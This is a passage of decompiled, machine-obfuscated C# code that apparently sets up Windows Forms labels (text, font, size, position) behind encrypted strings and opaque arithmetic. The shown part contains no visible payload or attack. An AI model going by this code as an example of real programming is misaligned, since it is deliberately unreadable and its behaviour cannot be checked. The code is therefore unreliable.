		array248[array2[0]] = string.Concat("\u05b2ᙳ", char.ToString('ኃ') + "\u0369ƙD\u001c");
		array248[Convert.ToInt32("3", _003CModule_003E.KeyValuePair__2[2])] = 'ࢮ';
		array248[(nint)((Array)(object)"\u0319\u0311").LongLength << Convert.ToInt32("1", 8)] = string.Concat("⎖}", char.ToString('᠗') + char.ToString('ጉ') + "Ļ\u0093&");
		int flattenHierarchy = FlattenHierarchy;
		int num383 = _003CModule_003E.ActivityOptions[1];
		array248[flattenHierarchy] = (byte)num383 != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_251, array248);
		string text171 = text170 + string_251;
		string string_252 = char.ToString('Ꮌ') + "ᎻᎦ";
		object[] array249 = new object[3];
		array249[Convert.ToInt32("0", 16)] = 8155;
		array249[Convert.ToInt32("1", 2)] = false;
		array249[2] = char.ToString((char)Convert.ToInt32("5045", 16)) + "ῂ嘋";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_252, array249);
		string text172 = string_252;
		string string_253 = char.ToString('\udeba') + "\udea7\udee8";
		object[] array250 = new object[checked(-883136 + Stind_I8)];
		array250[0] = Convert.ToInt32(char.ToString('1') + char.ToString('2') + "420", 8);
		array250[1] = 335;
		array250[2] = _003CModule_003E.KeyValuePair__2[45];
		array250[Marshal.SizeOf(typeof(CharSetMask))] = 0x87F & Marshal.SizeOf(typeof(CompareNotLessThan));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_253, array250);
		string text173 = string_253;
		string string_254 = string.Concat(char.ToString('ꍚ') + "ꍁꌎꍉ", char.ToString('ꍋ') + char.ToString('ꍚ') + "ꌎꍅꍋꍗ");
		object[] array251 = new object[5];
		array251[checked(Convert.ToInt32("0", 16) * -251747)] = string.Concat(char.ToString((char)array2[111]), char.ToString('}'), char.ToString('\u001a') + "\u0005\u0011\u0004\u0002");
		array251[1] = string.Concat(char.ToString('༗'), char.ToString('\u0013') + "\u001a\u0014");
		array251[2] = (byte)Convert.ToInt32("0", 16) != 0;
		array251[3] = 2490;
		array251[20 % Convert.ToInt32("10", 8)] = Convert.ToInt32("765e880c", 16) / 131517;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_254, array251);
		string string_255 = string.Concat(text169, text171, text172 + text173 + string_254);
		char c77 = (char)(_003CModule_003E.KeyValuePair__2[0] * 1);
		object[] array252 = new object[(uint)c77];
		int num384 = ((-514911 + _003CModule_003E.get_PositiveSign[185] != 57469) ? ((Parse != -26039) ? 944475 : (-952956)) : 0) * (-655893 / array2[2]);
		string string_256 = string.Concat(char.ToString('Ⅲ'), char.ToString('Ⅳ') + "ⅢⅣ");
		object[] array253 = new object[Convert.ToInt32(char.ToString('1') + "00", 2)];
		char c78 = (char)Convert.ToInt32("31", 16);
		array253[0] = (int)c78;
		array253[1] = (int)((-70680 <= array2[240]) ? '\ue67a' : array[67]);
		array253[array2[2] << array2[2]] = (char)CustomAttributeData;
		array253[(uint)array[5]] = Convert.ToInt32("1001100000110010101100011111000", 2) / 1031284;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_256, array253);
		string text174 = string_256;
		string string_257 = string.Concat(char.ToString('楎'), "楎楏", char.ToString('楏') + char.ToString('楏') + "楏楏楏楏楎");
		object[] array254 = new object[Convert.ToInt32("3", sizeof(long))];
		array254[0] = Marshal.SizeOf(typeof(ImageFileMachine));
		array254[1] = '图';
		array254[sizeof(ushort)] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_257, array254);
		string value20 = text174 + string_257;
		char c79 = (char)Marshal.SizeOf(typeof(ENODATA));
		array252[num384] = Convert.ToInt32(value20, (int)c79 & array2[Convert.ToInt32("0", 8)]);
		string string_258 = string.Concat(char.ToString((char)Convert.ToInt32("af13", 16)), char.ToString('꼐') + "꼕꼑꼒꼔");
		object[] array255 = new object[4];
		array255[Convert.ToInt32("0", 16)] = 'ˤ';
		array255[1] = array2[68];
		array255[_003CModule_003E.ActivityOptions[0]] = '㽨';
		array255[3] = (byte)Convert.ToInt32("0", Marshal.SizeOf(typeof(PrepareDelegate))) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_258, array255);
		string value21 = string_258;
		int fromBase10 = dwCookie;
		int num385 = default(int);
		checked
		{
			switch (Convert.ToInt32(value21, fromBase10) - unchecked(((Convert.ToInt32("37777732057", 8) >= 298327) ? (-703390) : 1233200) % Convert.ToInt32(char.ToString('7') + "86e0", Convert.ToInt32("10000", 2))))
			{
			case 0:
				num385 = array4[1];
				break;
			}
		}
		array252[num385] = (byte)((int)array4[Convert.ToInt32("0", 8)] % -274741) != 0;
		char c80 = (char)(~array2[9]);
		int num386 = c80;
		int num387 = default(int);
		switch (checked(-2 * (915466 - array2[241])))
		{
		case 0:
			num387 = ~_003CModule_003E.KeyValuePair__2[191];
			break;
		case 1:
		{
			int num388 = _003CModule_003E.ActivityOptions[161];
			num387 = num388;
			break;
		}
		case 2:
			num387 = Marshal.SizeOf(typeof(SetParent));
			break;
		}
		string text175 = char.ToString((char)num387);
		string text176 = char.ToString('㨕');
		string string_259 = "망덬";
		object[] array256 = new object[Convert.ToInt32("11", 2)];
		array256[0] = '\u1abb';
		array256[1] = 23270;
		array256[Stream] = array2[69];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_259, array256);
		array252[num386] = string.Concat(text175, text176 + string_259);
		_003CModule_003E.GetMaxByteCount(ref string_255, array252);
		((Control)ldloc6).set_Text(string_255);
		((Control)get_Modules).set_AutoSize(true);
		Label obj44 = get_Modules;
		string text177 = char.ToString((char)('쪓' | Convert.ToInt32(char.ToString('1') + char.ToString('1') + "521", 8)));
		string text178 = char.ToString((char)KeepAlive);
		string string_260 = "졚졒";
		object[] array257 = new object[Marshal.SizeOf(typeof(Stelem_Ref))];
		array257[0] = -524259 ^ _003CModule_003E.ActivityOptions[162];
		array257[1] = false;
		array257[(nint)((Array)(object)"\u0347\u0306").LongLength] = (char)Convert.ToInt32("27", ((Array)(object)"\u0319\u0332\u0307\u035c\u0311\u032b\u0343\u0359").Length);
		array257[Convert.ToInt32("3", 16)] = _003CModule_003E.KeyValuePair__2[145] & 0x17F;
		array257[4] = 106;
		int num389 = -905627 - _003CModule_003E.get_PositiveSign[186];
		int num390 = default(int);
		switch (Marshal.SizeOf(typeof(get_FullyQualifiedName)) + GetAssemblyName)
		{
		case 0:
			num390 = -468375;
			break;
		case 1:
			num390 = 4042;
			break;
		}
		array257[num389] = (char)num390;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_260, array257);
		string text179 = string_260;
		string string_261 = char.ToString((char)RequestRefuse) + char.ToString('넍') + "노녤";
		object[] array258 = new object[Convert.ToInt32("4", 8)];
		array258[0] = _003CModule_003E.ActivityOptions[163] >> GetUtf8SequenceLength;
		int num391 = _003CModule_003E.get_PositiveSign[187];
		array258[sizeof(sbyte)] = num391;
		int stream = Stream;
		int num392 = Convert.ToInt32("47d2", 16);
		array258[stream] = num392;
		array258[checked(645882 + op_Division)] = string.Concat(char.ToString('৪'), char.ToString('L'), char.ToString('ϖ') + char.ToString('\u074c') + "5ʩ");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_261, array258);
		string string_262 = string.Concat(text177, text178, text179 + string_261);
		object[] array259 = new object[3];
		int num393 = ((54276 == (0x94E4F ^ IComparer__1)) ? (-877344) : array2[2]) & (_003CModule_003E.ActivityOptions[1] / ~Convert.ToInt32("11111111011101010001100101011011", 2));
		string text180 = char.ToString((char)(SystemTime - (1186166 - array2[242])));
		int num395 = default(int);
		switch (1 * Marshal.SizeOf(typeof(UseHebrewParsing)))
		{
		case 0:
			num395 = -333353;
			break;
		case 1:
		{
			int num394 = ((Convert.ToInt32("1101100101110011", 2) != Convert.ToInt32("1011011000100100", 2)) ? 719 : 130348);
			num395 = num394;
			break;
		}
		}
		string text181 = char.ToString((char)num395);
		string string_263 = "尿剋";
		object[] array260 = new object[-3 * Convert.ToInt32("37777777777", 8)];
		array260[Convert.ToInt32("0", 8)] = Convert.ToInt32(char.ToString('3') + "d4b", 16);
		array260[1] = false;
		array260[array2[243] + array2[244]] = 6751;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_263, array260);
		array259[num393] = text180 + text181 + string_263;
		int num396 = HasFlagsAttribute | 0;
		string string_264 = string.Concat(char.ToString('疶'), char.ToString('疰'), char.ToString('疴') + "疶疴");
		object[] array261 = new object[3];
		array261[0] = 29581;
		array261[Convert.ToInt32("0", 2) | 1] = (byte)((Array)(object)string.Empty).Length != 0;
		array261[sizeof(ushort)] = checked(Convert.ToInt32("fff9d32b", 16) + 405196);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_264, array261);
		array259[num396] = (char)(Convert.ToInt32(string_264, 8) | (FusedMultiplyAddScalar >> 7));
		int num397 = array2[70] % 122362 - 61179;
		string text182 = char.ToString('4');
		string text183 = char.ToString((char)array2[array2[93]]);
		string string_265 = char.ToString('彂') + "彃彂";
		object[] array262 = new object[FlattenHierarchy];
		array262[0] = (char)Convert.ToInt32(char.ToString('1') + char.ToString('0') + "000001", 2);
		array262[1] = 358;
		array262[Convert.ToInt32("2", Marshal.SizeOf(typeof(PrepareDelegate)))] = SetOnCountdownMres;
		array262[3] = 'ݱ';
		array262[20 % Marshal.SizeOf(typeof(__c__DisplayClass0_6))] = (int)array[_003CModule_003E.get_PositiveSign[120]];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_265, array262);
		array259[num397] = (char)Convert.ToInt32(text182 + text183 + string_265, DefaultMemberAttribute >> 15);
		_003CModule_003E.GetMaxByteCount(ref string_262, array259);
		string text184 = string_262;
		int num398;
		int num399;
		int num400;
		checked
		{
			num398 = unchecked(0 / (Convert.ToInt32("101100001100011100111000010110", 2) / 486)) * -342582;
			num399 = array2[246] - -203994;
			num400 = _003CModule_003E.ActivityOptions[5];
		}
		int num401 = num399 * checked(num400 * 1);
		int num402 = (0x42901 | Marshal.SizeOf(typeof(DCloseScope))) >> 21;
		string string_266 = char.ToString('\uf1d9') + "\uf1d8\uf1d9";
		object[] array263 = new object[6];
		array263[Convert.ToInt32("0", 8) & 0] = false;
		array263[Convert.ToInt32("1", 8)] = 4573;
		array263[2] = _003CModule_003E.ActivityOptions[42];
		array263[endAction] = 4190;
		array263[4] = string.Concat(char.ToString((char)Convert.ToInt32("1101000010001", 2)), char.ToString('๖') + "ԏ࠵");
		array263[FlattenHierarchy] = 19868;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_266, array263);
		((Control)obj44).set_Font(new Font(text184, 8f, (FontStyle)num398, (GraphicsUnit)num401, (byte)(num402 << Convert.ToInt32(string_266, 10 % (int)array[6]))));
		((Control)get_Modules).set_ForeColor(SystemColors.Control);
		((Control)get_Modules).set_Location(new Point(445, array4[(-66235 <= Convert.ToInt32(char.ToString('1') + "11" + "11111111111110101001100110100", 2)) ? 14 : ((2217 == Convert.ToInt32("8a9", 16)) ? Convert.ToInt32("37774554347", 8) : Convert.ToInt32("11111111111111000001110000000100", 2))]));
		Label obj45 = get_Modules;
		string string_267 = "\u001b\u0016";
		object[] array264 = new object[(array[111] < 460035) ? 5 : (-492154)];
		array264[checked(_003CModule_003E.get_PositiveSign[188] + -398287)] = char.ToString('ך') + char.ToString('\u0902') + "ɫĲ";
		array264[(uint)array[3]] = Convert.ToInt32("11111111111110111001110110001000", 2) - -315809;
		array264[2] = 14247;
		array264[(nint)((Array)(object)(char.ToString('\u030c') + "\u0367\u0364")).LongLength] = 995;
		array264[0 | array[6]] = TryReadInt16LittleEndian;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_267, array264);
		string text185 = string_267;
		string text186 = char.ToString((char)array2[71]);
		string text187 = char.ToString('\uf27b');
		string string_268 = "堌塗";
		object[] array265 = new object[Convert.ToInt32("4", 8)];
		array265[0] = 39551;
		array265[Convert.ToInt32("1", 2)] = false;
		array265[2] = checked(Convert.ToInt32("11111111111111111111101111010011", 2) * -2);
		array265[array2[247] ^ array2[248]] = 1957;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_268, array265);
		string string_269 = string.Concat(text185, text186 + text187 + string_268);
		char c81 = (char)array6[array2[7] * 1];
		object[] array266 = new object[(int)c81];
		int num403 = ~_003CModule_003E.ActivityOptions[_003CModule_003E.get_PositiveSign[2]] << (int)(Convert.ToInt32("21", 8) * (nint)((Array)(object)"\u0341").LongLength);
		string string_270 = "\udc42";
		object[] array267 = new object[4];
		array267[(nint)((Array)(object)string.Empty).LongLength] = false;
		array267[1] = 1018181460 >> Convert.ToInt32("17", 8);
		array267[2] = string.Concat("\u059aτ", char.ToString('Ҷ') + "\u0003òë{");
		array267[3] = '劣';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_270, array267);
		string value22 = string_270;
		int fromBase11 = default(int);
		switch (checked(-520310 + (array2[249] >> 2)))
		{
		case 0:
			fromBase11 = -8 * array2[99];
			break;
		case 1:
			fromBase11 = array2[250] % Convert.ToInt32("fff461da", 16);
			break;
		}
		array266[num403] = (byte)Convert.ToInt32(value22, fromBase11) != 0;
		array266[_003CModule_003E.Dequeue[0 | _003CModule_003E.ActivityOptions[1]]] = 26157;
		string string_271 = "딞딂";
		object[] array268 = new object[3];
		array268[0] = false;
		array268[1] = 2966;
		array268[sizeof(ushort)] = 43665;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_271, array268);
		array266[(nint)((Array)(object)string_271).LongLength] = checked((unchecked(-247682550 % Convert.ToInt32("fa184404", 16)) | ((Associates >= -822321) ? (-1224973556) : (-882977))) + 255097);
		array266[Marshal.SizeOf(typeof(ArrayListDebugView))] = array6[-587376 / Marshal.SizeOf(typeof(UseHebrewParsing)) - Convert.ToInt32("1111111" + "11" + "11101110000100110000101", 2)];
		_003CModule_003E.GetMaxByteCount(ref string_269, array266);
		((Control)obj45).set_Name(string_269);
		Label obj46 = get_Modules;
		int num404 = Marshal.SizeOf(typeof(DRelease));
		int num405 = 1748 * Convert.ToInt32("fffffca4", 16);
		int num406 = ((Extend == -93401) ? (-601312) : 600319);
		int width9 = ((((num404 > num405 % num406) ? 1 : 0) != ((GetMethodSigHelper < 519304) ? Convert.ToInt32("fff9915d", 16) : (-828146)) - -421539) ? 236 : ((Convert.ToInt32("100110001111010101010001", 2) >> 6) - ((7909 > Convert.ToInt32("10111111010111000000", 2)) ? (-439878) : (-356317))));
		Label obj47;
		checked
		{
			((Control)obj46).set_Size(new Size(width9, array6[28] + (8561454 >> unchecked((int)((Array)(object)(char.ToString('\u0355') + char.ToString('\u0332') + "\u0319\u036b")).LongLength))));
			obj47 = get_Modules;
		}
		char c82 = (char)('\0' | array[2] | '\u0010');
		((Control)obj47).set_TabIndex((int)c82);
		Label obj48 = get_Modules;
		string text188 = char.ToString((char)(328438 >> Convert.ToInt32("4", 16)));
		string string_272 = char.ToString((char)array2[251]) + char.ToString('І') + "КН";
		object[] obj49 = new object[5] { "\u1b6c⡲", null, null, null, null };
		char c83 = (char)Convert.ToInt32("1", 8);
		obj49[(uint)c83] = char.ToString('ź') + "\u032f¾";
		obj49[(_003CModule_003E.ActivityOptions[164] <= -547915) ? Convert.ToInt32("11100110000011100010", 2) : _003CModule_003E.ActivityOptions[0]] = (int)array[45];
		int num407 = ((Convert.ToInt32("37777721403", 8) > -564623) ? Convert.ToInt32("3", 8) : Convert.ToInt32("37774603656", 8));
		obj49[num407] = Marshal.SizeOf(typeof(get_DisplayName));
		obj49[4] = 138;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_272, obj49);
		string text189 = text188 + string_272;
		string string_273 = "웯웦";
		object[] array269 = new object[(nint)((Array)(object)(char.ToString('\u0320') + char.ToString('\u0315') + "\u0328\u0305")).LongLength];
		array269[0] = (char)(_003CModule_003E.KeyValuePair__2[192] - -809898);
		array269[Marshal.SizeOf(typeof(UseHebrewParsing))] = 'З';
		array269[2] = (char)_003CModule_003E.ActivityOptions[11];
		array269[3] = 2331;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_273, array269);
		string text190 = string_273;
		int num408 = default(int);
		switch (checked(Convert.ToInt32("1247005", 8) + array2[252]))
		{
		case 0:
			num408 = 531089;
			break;
		case 1:
			num408 = 232733;
			break;
		case 2:
			num408 = 20546;
			break;
		}
		string text191 = char.ToString((char)num408);
		string string_274 = string.Concat("⸗\u2e73", char.ToString('\u2e58'), char.ToString('⸗') + "\u2e59\u2e58⹃⸗⹃");
		int num409 = ((Convert.ToInt32("37777777102", 8) > 685289) ? 995523 : Convert.ToInt32("11", 2));
		object[] array270 = new object[num409];
		array270[0] = 30736;
		array270[1] = (byte)_003CModule_003E.ActivityOptions[Marshal.SizeOf(typeof(UseHebrewParsing))] != 0;
		int num410 = default(int);
		switch (0 % array2[253])
		{
		case 0:
			num410 = 2;
			break;
		case 1:
			num410 = array2[254];
			break;
		}
		array270[num410] = char.ToString((char)Convert.ToInt32("303", 8)) + "ҵÇ";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_274, array270);
		string text192 = text190 + text191 + string_274;
		string string_275 = "\uf52b\uf520";
		object[] array271 = new object[5];
		array271[array2[array2[2]]] = 'ᚆ';
		array271[sizeof(bool)] = Convert.ToInt32("588f007", 16) >> 13;
		array271[732009324 >> (int)array[57]] = string.Concat(char.ToString('ɚ'), char.ToString('ڛ'), char.ToString('Ͳ') + char.ToString('߄') + "l1»");
		array271[113 >> Marshal.SizeOf(typeof(OverlappedData))] = (char)Marshal.SizeOf(typeof(MultiplyDoublingWideningLowerAndSubtractSaturate));
		array271[(nint)((Array)(object)"\u035b\u0356\u0352\u0364\u034d\u031b").LongLength & 4] = false;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_275, array271);
		string text193 = string_275;
		string string_276 = string.Concat(char.ToString('萜'), char.ToString('葛'), char.ToString('葉') + char.ToString('葙') + "葏葏");
		object[] array272 = new object[5];
		array272[0] = 20;
		array272[_003CModule_003E.ActivityOptions[2]] = 'ņ';
		array272[UsingNamespace - ArrayListEnumerator] = (char)(~Convert.ToInt32("ffffffb1", 16));
		char num411 = array[5];
		int num412 = ((DoNotWrapExceptions > 800549) ? 572347 : Convert.ToInt32("1010010111001", 2));
		array272[(uint)num411] = num412;
		array272[Convert.ToInt32("4", 16)] = 48611;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_276, array272);
		string text194 = string_276;
		string string_277 = string.Concat(char.ToString('\uf8e6') + "\uf8e1\uf8e8", "\uf8af\uf8fb\uf8e7\uf8ea" + "\uf8af\uf8ff\uf8ee\uf8fc\uf8fc\uf8f8\uf8e0\uf8fd\uf8eb\uf8a1");
		object[] array273 = new object[4];
		array273[0] = (char)Marshal.SizeOf(typeof(get_IsFaulted));
		array273[Convert.ToInt32("1", 8)] = (char)_003CModule_003E.KeyValuePair__2[46];
		array273[2] = _003CModule_003E.get_PositiveSign[189] ^ -352272;
		array273[Convert.ToInt32("11", _003CModule_003E.ActivityOptions[0])] = (char)array2[72];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_277, array273);
		string string_278 = string.Concat(text189, text192, text193 + text194 + string_277);
		object[] array274 = new object[6];
		int num413 = 319335 + _003CModule_003E.get_PositiveSign[190] - checked(-797044 + Convert.ToInt32("10000100001000000000", 2));
		int num414 = Convert.ToInt32("35", 8);
		int num415 = checked(num413 + array6[num414]);
		int num416 = default(int);
		switch (Convert.ToInt32("fff24ea7", 16))
		{
		case -897370:
			num416 = -294541;
			break;
		case -897369:
			num416 = -314190;
			break;
		}
		char c84 = (char)checked(num416 - -314636);
		array274[num415] = (int)c84;
		string string_279 = string.Concat("戇戇", char.ToString('戇') + char.ToString('扙') + "戃打戇托");
		object[] array275 = new object[2];
		array275[checked(Convert.ToInt32("11111111111111110101100011000001", 2) + Convert.ToInt32("a73f", 16))] = Convert.ToInt32("2310240", 8) - array2[255];
		array275[(60240 <= Marshal.SizeOf(typeof(MEMBER_ID_NIL))) ? 1 : 833652] = char.ToString('ಔ') + char.ToString('\u031f') + "\f÷";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_279, array275);
		int num417;
		int num418;
		checked
		{
			num417 = Convert.ToInt32(string_279, ((Array)(object)("\u0357\u035c\u0356\u0351" + "\u0306\u034d\u0313\u0318" + "\u0355\u0364\u030d\u0337\u032d\u0319\u036f\u0347")).Length) - unchecked((array2[256] | Marshal.SizeOf(typeof(GetMonthName))) - 523539);
			num418 = ((((44067 < Convert.ToInt32("10010011011100010101", 2)) ? 1 : 0) != array2[1]) ? _003CModule_003E.KeyValuePair__2[193] : array2[257]);
		}
		array274[num417] = (char)(checked(num418 + -936762) * -9);
		int num419 = -2 * ((Convert.ToInt32("cbddb773", 16) ^ 0xA8F93) | checked(Convert.ToInt32("144165", 8) * 17731));
		string string_280 = char.ToString((char)Convert.ToInt32("101000111110", 2)) + char.ToString('੬') + "\u0a3b੬";
		object[] array276 = new object[Marshal.SizeOf(typeof(OverlappedData)) & Marshal.SizeOf(typeof(OverlappedData))];
		array276[0 * array2[258]] = 'ࡗ';
		array276[1] = _003CModule_003E.get_PositiveSign[Convert.ToInt32("10000", 2)];
		array276[(Convert.ToInt32("1011000011101000", 2) == 45288) ? 2 : (-996891)] = 'L';
		array276[3] = (char)('w' & Convert.ToInt32("172", 8));
		array276[_003CModule_003E.ActivityOptions[(nint)((Array)(object)"\u0347\u036c\u0332").LongLength]] = _003CModule_003E.get_PositiveSign[array2[217]];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_280, array276);
		array274[num419] = Convert.ToInt32(string_280, 16) * (5 % Convert.ToInt32("2", 8));
		int num420 = checked(_003CModule_003E.LoadVector128[27] - -819754);
		string string_281 = char.ToString((char)Convert.ToInt32("1011101011010100", 2)) + char.ToString('뫗') + "뫖몁";
		object[] array277 = new object[Convert.ToInt32("6", array2[97])];
		array277[Convert.ToInt32("0", 8) / 626669405] = 45;
		array277[Convert.ToInt32("57edb", 16) ^ 0x57EDA] = 7962;
		array277[Convert.ToInt32("2065465", 8) - array2[259]] = (byte)(Convert.ToInt32("0", 2) | _003CModule_003E.ActivityOptions[1]) != 0;
		array277[get_ElapsedTicks >> array2[106]] = 32687;
		array277[4] = 4080;
		array277[5] = 3071;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_281, array277);
		string text195 = char.ToString((char)Convert.ToInt32(string_281, 16));
		int num421 = array2[73];
		int num422 = array2[261];
		string text196 = char.ToString((char)checked(num421 - num422));
		string text197 = char.ToString((char)CC_STDCALL);
		string string_282 = string.Concat(char.ToString('퉻'), char.ToString('홣') + "환픉");
		object[] array278 = new object[3];
		array278[_003CModule_003E.ActivityOptions[1] & 1] = _003CModule_003E.ActivityOptions[43];
		array278[Marshal.SizeOf(typeof(UseHebrewParsing))] = string.Concat(char.ToString('෭'), char.ToString('▜'), char.ToString('ڤ') + "Á\u07fdɪ");
		array278[2] = (byte)Convert.ToInt32("0", 16) != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_282, array278);
		array274[num420] = string.Concat(text195, text196, text197 + string_282);
		string string_283 = string.Concat(char.ToString('寸'), char.ToString('寽'), char.ToString('宩') + "宮宫");
		object[] array279 = new object[648262200 / Remaining];
		int num423 = default(int);
		switch (Marshal.SizeOf(typeof(IArraySortHelper__1)))
		{
		case 276369:
			num423 = 886999;
			break;
		case 276370:
			num423 = 0;
			break;
		}
		array279[num423] = 688;
		array279[Convert.ToInt32("1", sizeof(short))] = checked(Convert.ToInt32("3477377", 8) + -949917);
		array279[_003CModule_003E.ActivityOptions[(uint)array[2]]] = 14047;
		array279[3] = false;
		array279[_003CModule_003E.ActivityOptions[3]] = 'ڶ';
		array279[5] = 6898;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_283, array279);
		array274[4] = (byte)(Convert.ToInt32(string_283, 16) >> 20) != 0;
		char c85 = array[3];
		Label toVector128Unsafe;
		string string_284;
		object[] array280;
		checked
		{
			int num425 = default(int);
			switch (-758052 * unchecked((int)c85) - unchecked((_003CModule_003E.ActivityOptions[165] ^ -576981) * Convert.ToInt32("22", 8)))
			{
			case 0:
				num425 = array[2] | ((_003CModule_003E.KeyValuePair__2[194] > -491442) ? _003CModule_003E.get_PositiveSign[2] : _003CModule_003E.get_PositiveSign[191]);
				break;
			case 1:
			{
				int num424 = array2[262] - 518946;
				num425 = num424;
				break;
			}
			}
			array274[num425] = 1158;
			_003CModule_003E.GetMaxByteCount(ref string_278, array274);
			((Control)obj48).set_Text(string_278);
			toVector128Unsafe = ToVector128Unsafe;
			string_284 = "㻓";
			array280 = new object[2];
		}
		array280[(int)array[2] % 378354] = array[46];
		array280[1] = 'ᓱ';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_284, array280);
		string value23 = string_284;
		int fromBase12 = Convert.ToInt32("10", 8);
		((Control)toVector128Unsafe).set_AutoSize((byte)Convert.ToInt32(value23, fromBase12) != 0);
		Label toVector128Unsafe2 = ToVector128Unsafe;
		string text198 = char.ToString((char)(Convert.ToInt32(char.ToString('3') + char.ToString('4') + "0052", 8) % 45892));
		string text199 = char.ToString((char)Marshal.SizeOf(typeof(UnsafePack)));
		string text200 = char.ToString((char)_003CModule_003E.get_PositiveSign[_003CModule_003E.get_PositiveSign[43]]);
		string string_285 = string.Concat(char.ToString('ꈠ'), char.ToString('ꈪ') + "ꉯꈚꈆ");
		int num426 = default(int);
		switch (checked(array2[2] * 1))
		{
		case 0:
			num426 = 45262;
			break;
		case 1:
			num426 = 5;
			break;
		}
		object[] array281 = new object[num426];
		array281[(uint)array[Convert.ToInt32("2", 16)]] = string.Concat("Ô\u0087", char.ToString('\0') + char.ToString('\u0001') + "\0\u0005");
		array281[Convert.ToInt32("1", 8)] = checked(array2[263] + FromEnd);
		array281[2] = false;
		array281[3 & Convert.ToInt32("3", 16)] = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(ENXIO))), char.ToString('\u0006') + "$\u0003\u0013");
		array281[Convert.ToInt32("4", 8)] = 61356;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_285, array281);
		string string_286 = string.Concat(text198, text199, text200 + string_285);
		object[] array282 = new object[~((array2[_003CModule_003E.KeyValuePair__2[195]] >= _003CModule_003E.ActivityOptions[166] + 671116) ? (O_WRONLY / 1) : ((Convert.ToInt32("11111111111111110110001000000011", 2) != -60006) ? (-589128) : 275581))];
		int num427 = (0x700110 | (6728170 % Convert.ToInt32("12210304", 8))) >> 27;
		string string_287 = "빗";
		object[] array283 = new object[(uint)array[7]];
		array283[0] = 3909;
		array283[get_CurrencyGroupSeparator] = 11341;
		array283[2] = array2[122] | Marshal.SizeOf(typeof(MinHorizontal));
		array283[Convert.ToInt32("3", Convert.ToInt32("10000", 2))] = _003CModule_003E.KeyValuePair__2[47];
		array283[sizeof(int)] = string.Concat(char.ToString('ᨆ'), char.ToString('ς') + "ыƈŽ");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_287, array283);
		array282[num427] = (byte)Convert.ToInt32(string_287, Marshal.SizeOf(typeof(SkipLocalsInitAttribute)) / Marshal.SizeOf(typeof(Action__10)) + _003CModule_003E.get_PositiveSign[59]) != 0;
		char num428 = array4[array6[552167 - array2[264]]];
		string string_288 = string.Concat(char.ToString('\ue060'), char.ToString('\ue060') + "\ue063\ue031");
		object[] array284 = new object[sizeof(short)];
		int num429 = default(int);
		switch (5 % array2[0])
		{
		case 0:
			num429 = 613556;
			break;
		case 1:
			num429 = 0;
			break;
		}
		array284[num429] = string.Concat(char.ToString('睓'), char.ToString('岬'), char.ToString('ϗ') + "ܨØ");
		array284[-985718 - array2[265]] = string.Concat(char.ToString('\n'), char.ToString('\u001d') + char.ToString('S') + "\0\u0002");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_288, array284);
		string text201 = char.ToString((char)Convert.ToInt32(string_288, Convert.ToInt32("11100101111010010000", 2) + Convert.ToInt32("11111111111100011010000110000000", 2)));
		string text202 = char.ToString('Ѽ');
		string text203 = char.ToString((char)Convert.ToInt32("10" + char.ToString('1') + "110010", 2));
		string string_289 = string.Concat(char.ToString((char)array2[266]), char.ToString('何') + "但佄");
		object[] array285 = new object[_003CModule_003E.get_PositiveSign[Marshal.SizeOf(typeof(ENODATA))]];
		char c86 = (char)Convert.ToInt32("0", 8);
		array285[(int)c86] = (char)Convert.ToInt32(char.ToString('3') + "61", 16);
		checked
		{
			array285[1] = 34 * set_AMDesignator;
			array285[GetOrCreateThreadLocals + 100536] = _003CModule_003E.get_PositiveSign[60];
			array285[3] = Convert.ToInt32(char.ToString('2') + char.ToString('1') + "40", 8);
			array285[Marshal.SizeOf(typeof(IsValidText))] = array2[267] << 1;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_289, array285);
		}
		array282[(uint)num428] = string.Concat(text201, text202 + text203 + string_289);
		int num430 = default(int);
		switch (-2 * (0x66044 ^ Convert.ToInt32("37" + "776317673", Convert.ToInt32("1000", 2))))
		{
		case 0:
			num430 = _003CModule_003E.CalendarType[22];
			break;
		case 1:
			num430 = -801073;
			break;
		case 2:
		{
			char stream2 = (char)Stream;
			num430 = stream2;
			break;
		}
		}
		array282[num430] = array6[ConvertToUInt64RoundToZeroScalar % 24];
		int num431 = -20 % Convert.ToInt32("fffffff8", 16);
		string text204;
		int num433;
		string string_290;
		object[] array286;
		checked
		{
			array282[~num431] = HasBirthTime - (unchecked(Convert.ToInt32("13101041706", 8) / 2026) & Convert.ToInt32("10111" + "111" + "111011110111", 2));
			_003CModule_003E.GetMaxByteCount(ref string_286, array282);
			text204 = string_286;
			int num432 = ((Ldc_I4_1 <= -705520) ? array2[268] : Convert.ToInt32("0", 8));
			num433 = array6[num432];
			string_290 = string.Concat(char.ToString('獸') + "獸獸", char.ToString('獸') + "獿猯献猪");
			array286 = new object[4];
